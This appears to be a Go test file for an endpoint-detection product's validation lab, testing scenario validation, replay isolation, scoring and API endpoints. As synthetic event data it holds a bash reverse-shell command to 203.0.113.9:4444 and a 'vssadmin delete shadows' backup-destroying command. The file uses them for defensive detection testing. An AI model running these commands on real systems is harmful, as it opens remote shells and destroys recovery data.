// SPDX-License-Identifier: LicenseRef-Zyvor-Production-1.0
package edr

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

func mustScenarios(t *testing.T) ([]ValScenario, map[string]string) {
	t.Helper()
	scs, nt, err := LoadValidationScenarios()
	if err != nil {
		t.Fatalf("scenario pack invalid: %v", err)
	}
	return scs, nt
}

func TestValScenarioPack(t *testing.T) {
	scs, nt := mustScenarios(t)
	counts := map[string]int{}
	for _, s := range scs {
		counts[s.Kind]++
	}
	if counts["single"] < 120 || counts["chain"] < 18 || counts["benign"] < 30 {
		t.Fatalf("scenario counts too low: %v", counts)
	}
	if len(nt) == 0 {
		t.Fatal("not_testable reasons missing")
	}
	// A not-testable technique must not also carry a scenario.
	for _, s := range scs {
		for _, tech := range s.Techniques {
			if _, bad := nt[tech]; bad && s.Kind == "single" {
				t.Fatalf("%s: technique %s is declared not testable", s.ID, tech)
			}
		}
	}
}

func TestValScenarioSchemaRejects(t *testing.T) {
	ok := ValScenario{ID: "x-1", Name: "n", Description: "d", Kind: "single", Platform: "linux",
		Tactics: []string{"Execution"}, Techniques: []string{"T1059"}, Expect: []string{"T1059"},
		Steps: []ValStep{{Type: "process", Executable: "/bin/sh", Command: "sh -c id"}}}
	if err := ok.Validate(); err != nil {
		t.Fatalf("baseline should validate: %v", err)
	}
	mut := map[string]func(*ValScenario){
		"bad id":           func(s *ValScenario) { s.ID = "Bad_ID" },
		"bad platform":     func(s *ValScenario) { s.Platform = "plan9" },
		"bad tactic":       func(s *ValScenario) { s.Tactics = []string{"Hacking"} },
		"bad technique":    func(s *ValScenario) { s.Techniques = []string{"1059"} },
		"no expectation":   func(s *ValScenario) { s.Expect = nil },
		"benign mismatch":  func(s *ValScenario) { s.Benign = true },
		"unknown type":     func(s *ValScenario) { s.Steps[0].Type = "memory" },
		"foreign field":    func(s *ValScenario) { s.Steps[0].Destination = "x:1" },
		"process no cmd":   func(s *ValScenario) { s.Steps[0].Command = "" },
		"no steps":         func(s *ValScenario) { s.Steps = nil },
		"single two techs": func(s *ValScenario) { s.Techniques = []string{"T1059", "T1105"} },
	}
	for name, f := range mut {
		c := ok
		c.Steps = append([]ValStep(nil), ok.Steps...)
		f(&c)
		if c.Validate() == nil {
			t.Errorf("%s: expected rejection", name)
		}
	}
	// Strict decoding: unknown JSON fields are rejected.
	_, _, err := parseScenarioFiles(map[string][]byte{"x.json": []byte(`{"scenarios":[{"id":"a","bogus":1}]}`)})
	if err == nil {
		t.Fatal("unknown field accepted")
	}
	// Invalid telemetry (bad enum) is rejected at load time.
	bad := ValScenario{ID: "x-2", Name: "n", Description: "d", Kind: "single", Platform: "linux",
		Tactics: []string{"Credential Access"}, Techniques: []string{"T1110"}, Expect: []string{"T1110"},
		Steps: []ValStep{{Type: "auth", User: "u", Method: "carrier-pigeon", Outcome: "failure"}}}
	if bad.Validate() == nil {
		t.Fatal("invalid auth method accepted")
	}
}

// Replay must leave the live store, its ledger and every process-wide detection list untouched.
func TestValReplayIsolation(t *testing.T) {
	dir := t.TempDir()
	store, err := testStore(t, filepath.Join(dir, "findings.jsonl"), 100)
	if err != nil {
		t.Fatal(err)
	}
	live := Event{Time: time.Now().UTC(), Host: "real-host", PID: 42, UID: 0, Executable: "/bin/bash", Command: "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"}
	if _, err := store.Ingest(live); err != nil {
		t.Fatal(err)
	}
	snap := func() (string, int, int, int, *ContentRegistry) {
		files := ""
		ents, _ := os.ReadDir(dir)
		for _, e := range ents {
			b, _ := os.ReadFile(filepath.Join(dir, e.Name()))
			files += e.Name() + ":" + string(b) + "|"
		}
		iocMu.Lock()
		ni := len(iocs)
		iocMu.Unlock()
		ioaMu.Lock()
		na := len(ioas)
		ioaMu.Unlock()
		return files, len(store.List()), ni, na, contentReg.Load()
	}
	f1, n1, i1, a1, r1 := snap()
	scs, nt := mustScenarios(t)
	res := RunValidation(scs, ValOptions{})
	_ = BuildValidationCoverage(scs, res, nt, ValOptions{})
	f2, n2, i2, a2, r2 := snap()
	if f1 != f2 || n1 != n2 || i1 != i2 || a1 != a2 || r1 != r2 {
		t.Fatalf("replay changed live state: findings %d->%d iocs %d->%d ioas %d->%d ledger-equal=%v registry-same=%v", n1, n2, i1, i2, a1, a2, f1 == f2, r1 == r2)
	}
	for _, f := range store.List() {
		if strings.Contains(f.Host, "synthetic") {
			t.Fatalf("synthetic finding leaked into the store: %+v", f)
		}
	}
}

func TestValReplayDeterministic(t *testing.T) {
	scs, _ := mustScenarios(t)
	a, _ := json.Marshal(RunValidation(scs, ValOptions{}))
	b, _ := json.Marshal(RunValidation(scs, ValOptions{}))
	if string(a) != string(b) {
		t.Fatal("replay is not deterministic")
	}
}

// Benign negative controls must not fire at medium severity or above.
func TestValBenignControls(t *testing.T) {
	scs, _ := mustScenarios(t)
	n := 0
	for _, s := range scs {
		if !s.Benign {
			continue
		}
		n++
		r := ReplayScenario(s, ValOptions{})
		if r.FalsePositive || !r.Pass {
			t.Errorf("benign control %s fired: %s %+v", s.ID, r.Detail, r.Fired)
		}
	}
	if n < 30 {
		t.Fatalf("only %d benign controls", n)
	}
}

// A known-good emulation must be detected and a made-up one must be missed (sanity of the scorer).
func TestValScoring(t *testing.T) {
	good := ValScenario{ID: "g-1", Name: "n", Description: "d", Kind: "single", Platform: "windows",
		Tactics: []string{"Impact"}, Techniques: []string{"T1490"}, Expect: []string{"T1490"},
		Steps: []ValStep{{Type: "process", Executable: "C:\\Windows\\System32\\vssadmin.exe", Command: "vssadmin delete shadows /all /quiet"}}}
	if r := ReplayScenario(good, ValOptions{}); !r.Pass || r.Outcomes[0].Status != "detected" {
		t.Fatalf("expected detected: %+v", r)
	}
	miss := good
	miss.ID = "m-1"
	miss.Steps = []ValStep{{Type: "process", Executable: "/bin/true", Command: "true"}}
	if r := ReplayScenario(miss, ValOptions{}); r.Pass || r.Outcomes[0].Status != "missed" {
		t.Fatalf("expected missed: %+v", r)
	}
	// Expectation by rule id.
	byRule := good
	byRule.ID = "r-1"
	byRule.Expect = nil
	byRule.Steps[0].Expect = []string{"ioa-ioa-3"}
	if r := ReplayScenario(byRule, ValOptions{}); !r.Pass {
		t.Fatalf("rule-id expectation not met: %+v", r)
	}
}

// Regression gate: the Detected rate over non-benign scenarios must not fall below the documented
// floor (docs/research-validation-lab.md), and no benign control may fire.
func TestValDetectedRateFloor(t *testing.T) {
	scs, nt := mustScenarios(t)
	res := RunValidation(scs, ValOptions{})
	cov := BuildValidationCoverage(scs, res, nt, ValOptions{})
	sc := cov["scenarios"].(map[string]any)
	rate := sc["detect_rate"].(float64)
	t.Logf("detect rate %.3f (floor %.2f); technique counts %v; measured %.1f%% of %v claimed", rate, valDetectedFloor, cov["counts"], cov["measured_detected_pct"], cov["claimed_techniques"])
	if rate < valDetectedFloor {
		t.Fatalf("measured detection rate %.3f fell below the floor %.2f; failing scenarios: %v", rate, valDetectedFloor, sc["failing"])
	}
	if fp := sc["benign_false_positives"].(int); fp > valFalsePositiveCeiling {
		t.Fatalf("%d benign controls fired at medium or above: %v", fp, sc["false_positive_ids"])
	}
}

func TestValEndpoints(t *testing.T) {
	mux := http.NewServeMux()
	RegisterValidationLab(mux, "tok", nil)
	do := func(method, path, body string, auth bool) *httptest.ResponseRecorder {
		req := httptest.NewRequest(method, path, strings.NewReader(body))
		if auth {
			req.Header.Set("Authorization", "Bearer tok")
		}
		w := httptest.NewRecorder()
		mux.ServeHTTP(w, req)
		return w
	}
	for _, p := range [][2]string{{"GET", "/v1/validate/scenarios"}, {"GET", "/v1/validate/coverage"}, {"POST", "/v1/validate/run"}} {
		if w := do(p[0], p[1], `{"all":true}`, false); w.Code != 401 {
			t.Fatalf("%s %s unauthenticated: %d", p[0], p[1], w.Code)
		}
	}
	var list struct {
		Count int    `json:"count"`
		Note  string `json:"note"`
	}
	w := do("GET", "/v1/validate/scenarios", "", true)
	if w.Code != 200 || json.Unmarshal(w.Body.Bytes(), &list) != nil || list.Count < 150 || !strings.Contains(list.Note, "not a guarantee") {
		t.Fatalf("list: %d %s", w.Code, w.Body.String()[:200])
	}
	if w := do("GET", "/v1/validate/scenarios/benign-go-build", "", true); w.Code != 200 {
		t.Fatalf("detail: %d", w.Code)
	}
	if w := do("GET", "/v1/validate/scenarios/nope", "", true); w.Code != 404 {
		t.Fatalf("missing detail: %d", w.Code)
	}
	if w := do("POST", "/v1/validate/run", `{}`, true); w.Code != 400 {
		t.Fatalf("empty run: %d", w.Code)
	}
	if w := do("POST", "/v1/validate/run", `{"ids":["nope"]}`, true); w.Code != 404 {
		t.Fatalf("unknown id: %d", w.Code)
	}
	w = do("POST", "/v1/validate/run", `{"ids":["emu-t1490-vss-delete","benign-go-build"]}`, true)
	var run struct {
		Count    int         `json:"count"`
		Recorded bool        `json:"recorded"`
		Results  []ValResult `json:"results"`
	}
	if w.Code != 200 || json.Unmarshal(w.Body.Bytes(), &run) != nil || run.Count != 2 || run.Recorded {
		t.Fatalf("run: %d %s", w.Code, w.Body.String())
	}
	w = do("GET", "/v1/validate/coverage", "", true)
	var cov map[string]any
	if w.Code != 200 || json.Unmarshal(w.Body.Bytes(), &cov) != nil || cov["missed"] == nil || cov["not_testable"] == nil || cov["claimed_not_measured"] == nil || cov["note"] == nil {
		t.Fatalf("coverage: %d", w.Code)
	}
}
